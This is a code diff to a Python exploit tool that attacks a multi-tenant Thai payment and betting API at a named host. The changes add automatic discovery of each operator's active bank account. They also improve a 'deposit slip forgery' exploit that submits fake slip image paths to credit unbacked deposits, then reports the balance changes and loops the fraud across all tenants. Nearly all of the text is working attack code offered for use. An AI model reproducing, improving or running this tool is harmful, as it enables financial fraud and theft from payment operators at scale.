@@ -144,6 +144,55 @@ def do_auth(phone=None, password=None):
 
 # ─── EXPLOITS ─────────────────────────────────────────────────────────────────
 
+def get_active_bank_id(tid, domain, jwt):
+    """
+    Discover active payment_bank_information_id by querying /mb/payment-bank-information
+    per payment_type. Requires ?payment_type_id=<id> to return non-empty bank data.
+    Returns (bank_info_id, member_acct_id) or (None, None).
+    """
+    # Get payment types
+    code, raw = _r("GET",
+        f"https://{tid}mgapi.asdgapicenterssdo.com/mb/payment-type?domain={domain}", jwt)
+    if code != 200:
+        return None, None
+    types = json.loads(raw)
+    if isinstance(types, dict):
+        types = types.get("data", [])
+
+    # Get member's own bank account
+    code2, raw2 = _r("GET",
+        f"https://{tid}mgapi.asdgapicenterssdo.com/mb/member-account-default?domain={domain}", jwt)
+    acct_id = None
+    if code2 == 200:
+        m = json.loads(raw2)
+        items = m if isinstance(m, list) else [m]
+        if items and isinstance(items[0], dict):
+            acct_id = items[0].get("id")
+
+    # Try each payment type until we find an active bank
+    for pt in (types if isinstance(types, list) else []):
+        if not isinstance(pt, dict): continue
+        pt_id   = pt.get("id", "")
+        pt_code = pt.get("payment_type_code", pt.get("code", "?"))
+        if not pt_id: continue
+
+        c3, r3 = _r("GET",
+            f"https://{tid}mgapi.asdgapicenterssdo.com/mb/payment-bank-information"
+            f"?domain={domain}&payment_type_id={pt_id}", jwt)
+        if c3 != 200: continue
+        bd = json.loads(r3)
+        bank_data = bd.get("data", bd) if isinstance(bd, dict) else (bd[0] if isinstance(bd, list) and bd else {})
+        if not isinstance(bank_data, dict): continue
+        bank_id  = bank_data.get("id", "")
+        is_active = bank_data.get("is_active", 0)
+        acct_no   = bank_data.get("bank_account_no", bank_data.get("account_no", ""))
+        if bank_id and is_active:
+            info(f"Active bank: {pt_code} {acct_no} (id={bank_id[:16]}...)")
+            return bank_id, acct_id
+
+    return None, acct_id
+
+
 def exploit_F01_deposit():
     """F01 — Deposit Forgery: slip_image_url not validated"""
     banner("F01 — Deposit Slip Forgery")
@@ -151,46 +200,33 @@ def exploit_F01_deposit():
         info("Need JWT — authenticating...")
         if not do_auth(): return
 
-    amount_s = prompt("Amount (THB)", "100")
+    # Use --amount from CLI state if set, otherwise prompt
+    amount_default = str(_state.get('amount') or 100)
+    amount_s = prompt("Amount (THB)", amount_default)
     try:
         amount = float(amount_s)
     except ValueError:
         err("Invalid amount"); return
 
-    # 1. Get operator account
-    info("Getting operator bank account...")
-    code, raw = MGET("/mb/member-account-default")
-    if code != 200:
-        err(f"member-account-default: {code}"); return
-    accounts = json.loads(raw)
-    if not accounts:
-        err("No operator accounts"); return
-    acct_id   = accounts[0]["id"]
-    bank_code = accounts[0].get("bank_code", "KBANK")
-    bank_no   = accounts[0].get("account_no", "?")
-    ok(f"Operator bank: {bank_code} {bank_no}")
+    # 1. Discover active bank (payment_type_id-aware lookup)
+    info("Discovering active payment bank...")
+    tid, domain, jwt = _state['tid'], _state['domain'], _state['jwt']
+    bank_id, acct_id = get_active_bank_id(tid, domain, jwt)
 
-    # 2. Get payment bank info
-    info("Getting payment bank configuration...")
-    code, raw = MGET("/mb/payment-type")
-    pay_bank_id = None
-    if code == 200:
-        items = json.loads(raw)
-        if items:
-            pay_bank_id = items[0].get("id")
-            info(f"Payment type: {items[0].get('payment_type_code')} id={pay_bank_id[:12]}...")
-    if not pay_bank_id:
-        pay_bank_id = prompt("payment_bank_information_id (manual)", acct_id)
+    if not bank_id:
+        err("No active bank found — operator has no bank account enabled"); return
+    if not acct_id:
+        err("No member account found"); return
 
-    # 3. Submit forged deposit
+    # 2. Submit forged deposit
     ts = int(time.time()*1000)
     bkk = datetime.now(timezone(timedelta(hours=7)))
     fake_slip = f"slips/{bkk.strftime('%Y/%m/%d')}/slip_{ts}.jpg"
 
-    info(f"Submitting {amount:.2f} THB deposit with slip_image_url={fake_slip}")
+    info(f"Submitting {amount:.2f} THB deposit (slip_image_url NOT validated)")
     payload = {
         "deposit_amount":              amount,
-        "payment_bank_information_id": pay_bank_id,
+        "payment_bank_information_id": bank_id,
         "deposit_account_id":          acct_id,
         "slip_image_url":              fake_slip,
     }
@@ -198,10 +234,16 @@ def exploit_F01_deposit():
     print(f"\n  HTTP {code}:")
     jq(raw)
     if code == 200:
-        ok(f"DEPOSIT QUEUED for {amount:.2f} THB")
+        result = json.loads(raw)
+        tx_id  = result.get("id", "?")
+        status = result.get("approve_status", result.get("status", "?"))
+        bal_b  = result.get("balance_before_deposit", "?")
+        bal_a  = result.get("balance_after_deposit", "?")
+        ok(f"DEPOSIT QUEUED: TX {tx_id[:20]}  status={status}")
+        ok(f"Balance: {bal_b} → {bal_a} THB")
     elif code == 500 and "unavailable" in raw.lower():
-        err("Deposit method unavailable — operator has no active bank account configured")
-        info("Tip: try a different tenant with --tenant or use option [A] All Tenants Sweep")
+        err("All payment methods unavailable — operator bank disabled")
+        info("Tip: try [A] All-Tenant Sweep to find an active tenant")
     else:
         err(f"Failed: {code}")
 
@@ -407,24 +449,24 @@ def sweep_all_tenants():
         if not ok_auth:
             err(f"{name}: auth failed")
             continue
-        # quick deposit
-        code, raw = MGET("/mb/member-account-default")
-        if code == 200 and json.loads(raw):
-            acct_id = json.loads(raw)[0]["id"]
-            code, raw = MGET("/mb/payment-type")
-            pay_id = json.loads(raw)[0]["id"] if code == 200 and json.loads(raw) else acct_id
+        # quick deposit — use payment_type_id-aware bank discovery
+        bank_id, acct_id = get_active_bank_id(tid, domain, _state['jwt'])
+        if bank_id and acct_id:
             ts = int(time.time()*1000)
             fake = f"slips/2026/10/06/slip_{ts}.jpg"
             c2, r2 = MPOST("/mb/deposit-transaction", {
                 "deposit_amount": amount,
-                "payment_bank_information_id": pay_id,
+                "payment_bank_information_id": bank_id,
                 "deposit_account_id": acct_id,
                 "slip_image_url": fake,
             })
-            symbol = f"{GREEN}QUEUED{RESET}" if c2 == 200 else f"{RED}FAIL({c2}){RESET}"
-            print(f"  {name}: {symbol}")
+            if c2 == 200:
+                result = json.loads(r2)
+                print(f"  {name}: {GREEN}QUEUED{RESET} TX={result.get('id','?')[:20]} status={result.get('approve_status','?')}")
+            else:
+                print(f"  {name}: {RED}FAIL({c2}){RESET} {r2[:60]}")
         else:
-            print(f"  {name}: {RED}mgapi unreachable ({code}){RESET}")
+            print(f"  {name}: {RED}no active bank{RESET}")
 
     _state.update(original)
 
@@ -591,17 +633,13 @@ def loop_all_tenants(firebase_key: str = None, amount: float = 100.0):
                     ok(f"Balance: {d.get('balance','?')} THB")
 
         # ── F01: Try forged deposit ──────────────────────────────────────────
-        code, raw = MGET("/mb/member-account-default")
-        if code == 200 and json.loads(raw):
-            accounts = json.loads(raw)
-            acct_id = accounts[0]["id"]
-            code2, raw2 = MGET("/mb/payment-type")
-            pay_id = json.loads(raw2)[0]["id"] if code2 == 200 and json.loads(raw2) else acct_id
+        bank_id, acct_id = get_active_bank_id(tid, domain, _state['jwt'])
+        if bank_id and acct_id:
             ts = int(time.time()*1000)
             fake = f"slips/2026/10/06/slip_{ts}.jpg"
             c3, r3 = MPOST("/mb/deposit-transaction", {
                 "deposit_amount": amount,
-                "payment_bank_information_id": pay_id,
+                "payment_bank_information_id": bank_id,
                 "deposit_account_id": acct_id,
                 "slip_image_url": fake,
             })
@@ -609,9 +647,10 @@ def loop_all_tenants(firebase_key: str = None, amount: float = 100.0):
             symbol = GREEN+"QUEUED"+RESET if c3 == 200 else RED+f"FAIL({c3})"+RESET
             print(f"  deposit-transaction: {symbol}")
             if c3 == 200:
-                ok(f"DEPOSIT QUEUED {amount:.0f} THB on {name}")
+                r3d = json.loads(r3)
+                ok(f"DEPOSIT QUEUED {amount:.0f} THB on {name}  TX={r3d.get('id','?')[:20]}")
         else:
-            info(f"member-account-default: {code} — mgapi may be down")
+            info(f"No active bank found — operator bank disabled on {name}")
 
         results.append(row)
 
@@ -657,6 +696,9 @@ def main():
     if found:
         _, (name, tid, domain) = found[0]
         _state.update({'tenant': name, 'tid': tid, 'domain': domain})
+
+    # Store CLI amount so exploit_F01_deposit() picks it up
+    _state['amount'] = args.amount
 
     # Auth
     if args.jwt:
